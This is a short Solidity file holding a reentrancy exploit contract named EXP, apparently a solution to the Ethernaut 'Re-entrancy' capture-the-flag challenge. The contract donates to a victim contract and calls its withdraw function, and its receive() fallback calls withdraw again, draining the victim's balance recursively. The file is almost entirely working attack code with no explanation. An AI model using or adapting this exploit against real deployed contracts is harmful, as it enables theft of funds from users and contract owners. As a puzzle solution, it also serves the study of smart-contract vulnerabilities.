// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Reentrance {
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external ;
  receive() external payable;
}

contract EXP{
    Reentrance victim;
    
    constructor(address payable _addr) public {
        victim = Reentrance(_addr);
    }

    function donate() public payable {
        victim.donate{value: msg.value}(address(this)); // 0.001 ether
    }

    function hack(uint _amount) public {
        victim.withdraw(_amount);
    }

    receive() external payable{
        victim.withdraw(0.0005 ether);
    }
}
